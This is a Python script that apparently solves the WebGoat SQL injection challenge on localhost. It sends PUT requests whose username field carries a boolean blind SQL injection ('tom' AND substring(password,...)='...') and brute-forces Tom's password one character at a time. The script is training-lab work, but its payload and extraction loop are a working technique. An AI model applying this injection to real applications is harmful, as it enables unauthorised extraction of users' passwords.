import requests as req

url = 'http://localhost:8081/WebGoat/SqlInjection/challenge'

headers = {
	'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0',
	'Accept': '*/*',
	'Accept-Language': 'en-US,en;q=0.5',
	'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'X-Requested-With': 'XMLHttpRequest',
	'Cookie': 'JSESSIONID=5AB5D052C53B91F4D792E120C9A2A133',
	'Host': 'localhost:8081',
	'Referer': 'https://localhost:8081/WebGoat/start.mvc'
}

data = {
	"username_reg": "",
	"email_reg": "t@t",
	"password_reg" : "a",
	"confirm_password_reg" :"a"
}

password = 'thisisasecretfortomonly'

username = "tom' AND substring(password,1,24)='"

alphabet= ' ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=+!"£$%^&*()[]{};:@#~,<.>/?`¬\|'

alphabet1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 '

sql_input=username+password

data["username_reg"] = sql_input

for c in alphabet:
	try1=password+c
	try1=username+try1
	data["username_reg"] = try1
	resp = req.put(url=url,headers=headers,data=data)
	if resp.json()['lessonCompleted']==False:
		print(c)
	else:
		print(data["username_reg"])
	
	

#resp = req.put(url=url,headers=headers,data=data)

#print(resp.json())


def create_string(u,p):
	return u+p
